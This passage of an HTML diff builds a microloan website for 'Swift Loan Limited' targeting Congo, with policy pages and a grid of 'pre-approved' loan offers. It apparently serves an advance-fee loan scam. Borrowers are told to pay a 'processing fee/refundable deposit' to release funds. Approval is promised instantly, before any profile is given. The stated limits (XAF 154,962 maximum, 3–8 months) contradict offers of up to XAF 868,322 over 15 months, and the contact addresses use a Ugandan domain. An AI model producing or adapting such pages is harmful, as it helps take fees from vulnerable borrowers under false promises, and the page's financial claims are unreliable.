+                <li>Credit reference bureaus for credit checks</li>
+                <li>Payment service providers for transactions</li>
+                <li>Government agencies when required by law</li>
+                <li>Third-party service providers who assist us in operations</li>
+            </ul>
+            <p>We do not sell your personal information to third parties.</p>
+            
+            <h2>5. Data Security</h2>
+            <p>We implement industry-standard security measures including 256-bit encryption, secure servers, and regular security audits to protect your data.</p>
+            
+            <h2>6. Your Rights</h2>
+            <p>Under Congo's Data Protection Act, you have the right to:</p>
+            <ul>
+                <li>Access your personal data</li>
+                <li>Correct inaccurate information</li>
+                <li>Request deletion of your data (subject to legal requirements)</li>
+                <li>Withdraw consent for data processing</li>
+            </ul>
+            
+            <h2>7. Contact Us</h2>
+            <p>For privacy-related questions, contact us at:<br>
+            Email: privacy@swiftloan.ug<br>
+            Phone: 0709-029-000</p>
+        </div>
+    </div>
+
+    <!-- Loan Rules Page -->
+    <div class="page-modal" id="page-loan-rules">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('loan-rules')">
+                <span>←</span> Back
+            </button>
+            <h2>Loan Rules</h2>
+        </div>
+        <div class="page-content">
+            <h1>Loan Rules & Guidelines</h1>
+            
+            <h2>1. Eligibility Requirements</h2>
+            <ul>
+                <li>Must be a Congolese citizen aged 18 years or older</li>
+                <li>Must have a valid national ID card</li>
+                <li>Must have an active phone number registered in your name</li>
+                <li>Must have a verifiable source of income</li>
+                <li>Must not be listed on CRB with negative credit history</li>
+            </ul>
+            
+            <h2>2. Loan Amounts & Terms</h2>
+            <ul>
+                <li>Minimum loan amount: XAF 23,256</li>
+                <li>Maximum loan amount: XAF 154,962</li>
+                <li>Repayment period: 3 to 8 months</li>
+                <li>Monthly interest rate: 0.86%</li>
+                <li>Processing fee: Varies by loan amount</li>
+            </ul>
+            
+            <h2>3. Application Process</h2>
+            <ol>
+                <li>Complete the online application form with accurate information</li>
+                <li>Submit required documents (ID, proof of income)</li>
+                <li>Wait for instant automated approval</li>
+                <li>Review and accept loan offer</li>
+                <li>Pay processing fee to release funds</li>
+                <li>Receive loan disbursement via Mobile Money</li>
+            </ol>
+            
+            <h2>4. Repayment Rules</h2>
+            <ul>
+                <li>Repayment is due on the agreed date in your loan agreement</li>
+                <li>Early repayment is allowed without penalties</li>
+                <li>Late payments incur additional charges</li>
+                <li>Failed payments will be reported to Credit Reference Bureaus</li>
+            </ul>
+            
+            <h2>5. Default Consequences</h2>
+            <p>Failure to repay your loan may result in:</p>
+            <ul>
+                <li>Negative credit bureau listing</li>
+                <li>Legal action and debt collection</li>
+                <li>Inability to access future loans</li>
+                <li>Additional penalty charges</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Terms & Conditions Page -->
+    <div class="page-modal" id="page-terms">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('terms')">
+                <span>←</span> Back
+            </button>
+            <h2>Terms & Conditions</h2>
+        </div>
+        <div class="page-content">
+            <h1>Terms & Conditions</h1>
+            <p><strong>Last Updated: November 2025</strong></p>
+            
+            <h2>1. Agreement to Terms</h2>
+            <p>By accessing and using Swift Loan Limited's services, you agree to be bound by these Terms and Conditions.</p>
+            
+            <h2>2. Services Provided</h2>
+            <p>Swift Loan Limited provides microfinance lending services to qualified applicants in Congo.</p>
+            
+            <h2>3. Loan Agreement</h2>
+            <p>When you accept a loan offer, you enter into a legally binding agreement with Swift Loan Limited.</p>
+            
+            <h2>4. Interest Rates and Fees</h2>
+            <ul>
+                <li>Monthly interest rate: 0.86%</li>
+                <li>Processing fee: As displayed per offer</li>
+                <li>All fees are clearly disclosed before loan acceptance</li>
+            </ul>
+            
+            <h2>5. Disbursement</h2>
+            <p>Loan funds are disbursed via Mobile Money after approval and fee payment.</p>
+            
+            <h2>6. Repayment Obligations</h2>
+            <p>You agree to repay the full loan amount plus interest by the due date.</p>
+            
+            <h2>7. Default and Collections</h2>
+            <p>In the event of default, we may report your account to Credit Reference Bureaus and take legal action.</p>
+            
+            <h2>8. Governing Law</h2>
+            <p>These terms are governed by the laws of Congo.</p>
+            
+            <h2>9. Contact Information</h2>
+            <p>For questions, contact us at:<br>
+            Email: legal@swiftloan.ug<br>
+            Phone: 0709-029-000</p>
+        </div>
+    </div>
+
+    <!-- Promotions Page -->
+    <div class="page-modal" id="page-promotions">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('promotions')">
+                <span>←</span> Back
+            </button>
+            <h2>Promotions</h2>
+        </div>
+        <div class="page-content">
+            <h1>Current Promotions & Offers</h1>
+            
+            <h2>Welcome Bonus - First Time Borrowers</h2>
+            <p><strong>Get 50% off processing fees on your first loan!</strong></p>
+            <p>New to Swift Loan? We're offering first-time borrowers a special discount.</p>
+            
+            <h2>Loyalty Rewards Program</h2>
+            <p><strong>Earn rewards for being a responsible borrower</strong></p>
+            <ul>
+                <li>Repay 3 loans on time: Get 10% discount on your next processing fee</li>
+                <li>Repay 5 loans on time: Get 25% discount on your next processing fee</li>
+                <li>Repay 10 loans on time: Get 50% discount on your next processing fee</li>
+            </ul>
+            
+            <h2>Referral Program</h2>
+            <p><strong>Refer a friend and earn XAF 78</strong></p>
+            <p>Share Swift Loan with friends and family. When they take their first loan, you both receive XAF 78!</p>
+            
+            <h2>Early Repayment Bonus</h2>
+            <p><strong>Repay early and save on interest</strong></p>
+            <p>Repay your loan before the due date and pay zero interest on the remaining period.</p>
+        </div>
+    </div>
+
+    <!-- Services Page -->
+    <div class="page-modal" id="page-services">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('services')">
+                <span>←</span> Back
+            </button>
+            <h2>Our Services</h2>
+        </div>
+        <div class="page-content">
+            <h1>Our Services</h1>
+            
+            <h2>Personal Loans</h2>
+            <p>Quick access to personal loans ranging from XAF 23,256 to XAF 154,962. Perfect for emergency expenses, medical bills, education fees, or any personal financial need.</p>
+            <ul>
+                <li>Instant approval within minutes</li>
+                <li>Flexible repayment terms (3-8 months)</li>
+                <li>Competitive interest rates at 0.86% monthly</li>
+                <li>No collateral required</li>
+            </ul>
+            
+            <h2>Business Loans</h2>
+            <p>Empower your business with working capital for expansion, inventory, or managing cash flow.</p>
+            
+            <h2>Emergency Loans</h2>
+            <p>When emergencies strike, get immediate access to funds within minutes. Available 24/7.</p>
+            
+            <h2>Mobile Money Integration</h2>
+            <p>Seamless integration with Congo's leading mobile money platforms for instant disbursement and easy repayment.</p>
+            
+            <h2>Customer Support</h2>
+            <p>Our dedicated support team is available to assist you:</p>
+            <ul>
+                <li>Phone: 0709-029-000</li>
+                <li>Email: info@swiftloan.ug</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Cookie Settings Page -->
+    <div class="page-modal" id="page-cookies">
+        <div class="page-header">
+            <button class="back-btn" onclick="closePage('cookies')">
+                <span>←</span> Back
+            </button>
+            <h2>Cookie Settings</h2>
+        </div>
+        <div class="page-content">
+            <h1>Cookie Policy & Settings</h1>
+            
+            <h2>What Are Cookies?</h2>
+            <p>Cookies are small text files stored on your device when you visit our website. They help us provide you with a better experience.</p>
+            
+            <h2>Types of Cookies We Use</h2>
+            
+            <h3>1. Essential Cookies (Always Active)</h3>
+            <p>These cookies are necessary for the website to function properly.</p>
+            
+            <h3>2. Performance Cookies</h3>
+            <p>These cookies help us understand how visitors interact with our website.</p>
+            
+            <h3>3. Functional Cookies</h3>
+            <p>These cookies remember your preferences and choices.</p>
+            
+            <h3>4. Marketing Cookies</h3>
+            <p>These cookies track your browsing activity to deliver relevant advertisements.</p>
+            
+            <h2>How to Control Cookies</h2>
+            <p>Most web browsers allow you to control cookies through browser settings.</p>
+            
+            <h2>Contact Us</h2>
+            <p>If you have questions about our use of cookies, contact us at:<br>
+            Email: privacy@swiftloan.ug<br>
+            Phone: 0709-029-000</p>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="gradient-hero min-h-screen">
+        <!-- Hero Section -->
+        <section class="py-8 px-4 sm:px-6 lg:px-8">
+            <div class="text-center mb-8">
+                <h1 class="hero-title text-3xl lg:text-4xl font-bold text-gray-900 leading-tight mb-4">
+                    Your Personalized
+                    <span class="swift-primary relative">
+                        Loan Offers
+                        <svg class="absolute -bottom-1 left-0 w-full h-2" viewBox="0 0 200 8" fill="none" preserveAspectRatio="none">
+                            <path fill="#FF6B00" opacity="0.3">
+                                <animate attributeName="d" dur="3s" repeatCount="indefinite"
+                                    values="M0,6 Q50,0 100,6 T200,6 L200,12 L0,12 Z;
+                                            M0,6 Q50,12 100,6 T200,6 L200,12 L0,12 Z;
+                                            M0,6 Q50,0 100,6 T200,6 L200,12 L0,12 Z"/>
+                            </path>
+                        </svg>
+                    </span>
+                </h1>
+             <p id="congo-time" class="text-sm text-gray-500 mt-2"></p>
+            </div>
+        </section>
+
+        <!-- Loading Status Message -->
+        <div id="loadingMessage" class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 mb-8">
+            <div class="bg-blue-50 border border-blue-200 rounded-xl p-6 shadow-swift text-center">
+                <div class="flex items-center justify-center space-x-3">
+                    <svg class="animate-spin h-8 w-8 text-primary" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    <div>
+                        <p class="text-lg font-semibold text-primary loading-text">Calculating your personalized loan offers</p>
+                        <p class="text-sm text-gray-600 mt-1">Please wait while we analyze your profile...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- User Info Card -->
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 mb-8" style="display: none;" id="userInfoCard">
+            <div class="bg-white border border-gray-200 rounded-xl px-4 py-2.5 shadow-swift flex items-center gap-3">
+                <div class="w-8 h-8 bg-primary rounded-full flex items-center justify-center flex-shrink-0">
+                    <svg class="text-white" width="16" height="16" fill="currentColor" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <span class="font-semibold text-gray-800 text-sm card-name">Loading...</span>
+                    <span class="text-gray-400 mx-1.5">·</span>
+                    <span class="text-xs text-gray-500 card-id">ID: —</span>
+                </div>
+                <span class="text-xs font-bold text-white bg-green-500 px-2.5 py-1 rounded-full whitespace-nowrap">Pre-Approved · Credit Score 60%</span>
+            </div>
+        </div>
+
+
+        <!-- Loan Offers Section -->
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 pb-12">
+            <div class="grid gap-6 md:grid-cols-2 lg:grid-cols-3" id="loanOffersContainer">
+                <!-- Loan Offer 1 - Quick Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="64656" data-fee="2926" data-tracking="LN-10001" data-months="3" data-offer-name="Emergency Micro Credit">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="emergency-micro.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Emergency Micro Credit</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10001</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Perfect for urgent needs or small expenses, get quick access to cash instantly.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 64,656</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 2,926</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">3 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 64,071</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">22,118</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+
+                <!-- Loan Offer 2 - Standard Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="108540" data-fee="4564" data-tracking="LN-10002" data-months="4" data-offer-name="Consumer Installment Loan">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="consumer-loan.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Consumer Installment Loan</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10002</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">A balanced option for medium expenses like bills, shopping, or small projects.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 108,540</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 4,564</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">4 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 107,607</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">27,720</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+
+                <!-- Loan Offer 3 - Plus Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="217080" data-fee="9098" data-tracking="LN-10003" data-months="6" data-offer-name="Household Credit Advance">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="household-credit.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Household Credit Advance</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10003</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Great for bigger purchases or investment opportunities with flexible repayment.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 217,080</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 9,098</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">6 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 215,214</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">37,278</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+
+                <!-- Loan Offer 4 - Premium Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="325765" data-fee="13546" data-tracking="LN-10004" data-months="8" data-offer-name="Payroll Credit Facility">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="payroll-credit.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Payroll Credit Facility</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10004</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Ideal for school fees, home upgrades, or managing large expenses conveniently.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 325,765</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 13,546</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">8 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 322,820</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">42,293</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+
+                <!-- Loan Offer 5 - Mega Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="434161" data-fee="17993" data-tracking="LN-10005" data-months="10" data-offer-name="Enterprise Development Finance">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="enterprise-finance.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Enterprise Development Finance</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10005</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Best for business growth, home improvements, or major purchases.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 434,161</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 17,993</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">10 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 430,453</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">45,496</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+
+                <!-- Loan Offer 6 - Elite Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="651242" data-fee="0" data-tracking="LN-10006" data-months="12" data-offer-name="Structured Term Finance">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="structured-term.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Structured Term Finance</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10006</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Perfect for larger projects, business expansion, or consolidating debts.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 651,242</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 0</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">12 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
+                            <span class="font-semibold text-gray-700">You'll receive:</span>
+                            <span class="font-bold text-primary text-lg">XAF 645,642</span>
+                        </div>
+                        <div class="monthly-payment-info bg-blue-50 p-2 rounded-lg">
+                            <div class="flex justify-between text-sm">
+                                <span class="text-gray-600">Monthly Payment:</span>
+                                <span class="font-semibold text-blue-600">XAF <span class="monthly-amount">57,354</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="w-full bg-primary text-white py-3 px-4 rounded-lg font-semibold hover:bg-primary-dark transition-colors duration-200 select-offer-btn">
+                        Select This Offer
+                    </button>
+                </div>
+
+                <!-- Loan Offer 7 - Ultimate Loan -->
+                <div class="loan-card bg-white rounded-xl shadow-swift hover:shadow-xl transition-all duration-300 p-6 border border-gray-200 transform hover:scale-105 hover:rotate-1 hover:shadow-2xl" data-amount="868322" data-fee="0" data-tracking="LN-10007" data-months="15" data-offer-name="Capital Investment Loan">
+                    <div class="flex justify-between items-start mb-4">
+                        <h3 class="text-lg font-bold text-gray-800"><img src="capital-loan.png" alt="" style="width:20px;height:20px;object-fit:contain;display:inline-block;vertical-align:middle;margin-right:6px;">Capital Investment Loan</h3>
+                        <span class="bg-primary text-white text-xs px-3 py-1 rounded-full">LN-10007</span>
+                    </div>
+                    <p class="text-sm text-gray-500 mb-3">Tailored for big investments, property, or long-term financial planning.</p>
+                    <div class="space-y-3 mb-6">
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Loan Amount:</span>
+                            <span class="font-bold text-green-600">XAF 868,322</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">
+                                Processing Fee/refundable deposit:
+                                <a href="#" class="explain-fee-link text-primary text-xs underline ml-1">why fee?</a>
+                            </span>
+                            <span class="font-semibold text-orange-600">XAF 0</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600">Monthly Rate:</span>
+                            <span class="font-semibold text-blue-600">0.86%</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-gray-600 flex items-center">
+                                Repayment Period:
+                                <span class="ml-1 relative group">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400 cursor-pointer" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M12 18a9 9 0 100-18 9 9 0 000 18z"/>
+                                    </svg>
+                                    <span class="absolute bottom-full mb-2 hidden group-hover:block w-48 bg-gray-800 text-white text-xs rounded-lg px-2 py-1 shadow-lg">
+                                        This is the number of months you'll repay your loan in equal installments.
+                                    </span>
+                                </span>
+                            </span>
+                            <span class="font-semibold text-purple-600">15 months</span>
+                        </div>
+                        <div class="flex justify-between pt-2 border-t border-gray-200">
